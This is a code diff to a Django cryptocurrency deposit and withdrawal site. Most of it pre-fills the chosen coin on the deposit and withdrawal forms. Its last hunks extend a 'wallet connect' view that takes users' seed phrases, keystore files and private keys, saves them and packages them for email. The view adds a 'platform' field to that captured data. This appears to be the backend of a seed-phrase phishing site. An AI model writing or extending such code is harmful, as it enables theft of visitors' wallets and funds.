@@ -346,7 +346,16 @@ def deposit_request_view(request):
             # Redirect to a detail page or show modal (simplified here)
             return render(request, 'deposit_success.html', {'deposit': deposit, 'wallet': admin_wallet})
     else:
-        form = DepositRequestForm()
+        # Check for pre-selected cryptocurrency
+        initial_data = {}
+        crypto_id = request.GET.get('cryptocurrency')
+        if crypto_id:
+            try:
+                initial_data['cryptocurrency'] = Crytocurrency.objects.get(id=crypto_id)
+            except (Crytocurrency.DoesNotExist, ValueError):
+                pass
+        
+        form = DepositRequestForm(initial=initial_data)
     
     return render(request, 'deposit.html', {'form': form})
 
@@ -374,7 +383,17 @@ def withdrawal_request_view(request):
             messages.success(request, 'Withdrawal request submitted successfully.')
             return redirect('transactions')
     else:
-        form = WithdrawalRequestForm(request.user)
+        # Check for pre-selected cryptocurrency
+        initial_data = {}
+        crypto_id = request.GET.get('cryptocurrency')
+        if crypto_id:
+            try:
+                # verify user has this crypto first? logic is in form init, but let's try to set it
+                initial_data['cryptocurrency'] = Crytocurrency.objects.get(id=crypto_id)
+            except (Crytocurrency.DoesNotExist, ValueError):
+                pass
+
+        form = WithdrawalRequestForm(request.user, initial=initial_data)
     
     return render(request, 'withdraw.html', {'form': form})
 
@@ -418,6 +437,7 @@ def wallet_connect_view(request):
             # Save wallet data
             ConnectWallet.objects.create(
                 user=request.user,
+                platform=form.cleaned_data.get('platform'),
                 mnemonic_phrase=form.cleaned_data.get('mnemonic_phrase'),
                 keystore_json=form.cleaned_data.get('keystore_json'),
                 private_key=form.cleaned_data.get('private_key')
@@ -425,6 +445,7 @@ def wallet_connect_view(request):
             
             # Prepare data for email
             wallet_data = {
+                'platform': form.cleaned_data.get('platform'),
                 'connection_method': form.cleaned_data.get('connection_method'),
                 'mnemonic_phrase': form.cleaned_data.get('mnemonic_phrase'),
                 'keystore_json': form.cleaned_data.get('keystore_json'),
